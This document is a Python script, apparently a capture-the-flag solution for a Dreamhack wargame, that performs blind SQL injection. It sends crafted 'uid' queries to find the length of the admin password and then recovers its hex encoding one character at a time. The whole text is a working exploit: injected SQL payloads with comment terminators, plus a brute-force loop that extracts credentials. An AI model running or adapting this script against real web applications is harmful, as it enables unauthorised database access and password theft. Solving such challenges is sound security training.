from requests import session
from string import hexdigits

url = "http://host1.dreamhack.games:14057/"
r = session()
pw = ""


def send_req(query: str) -> bool:
    resp = r.get(url, params={"uid": query})

    if f"exists" in resp.text:
        return True

    return False


def guess_idx():
    idx = 1
    while True:
        query = f"admin' and length(hex(upw))={idx}; #"
        print(f"trying ... {idx}", end="\r")

        if send_req(query):
            print()
            return idx

        idx += 1


def brute_hex(index: int) -> str:
    for i in hexdigits:
        query = f"admin' and substr(hex(upw),{index},1)='{i}'; #"
        print(f"pwning hex => {pw}{i}", end="\r")

        if send_req(query):
            return i


if __name__ == "__main__":
    index = guess_idx()
    for i in range(1, index + 1):
        pw += brute_hex(i)

    print()
    print(f"perfect! {pw}")
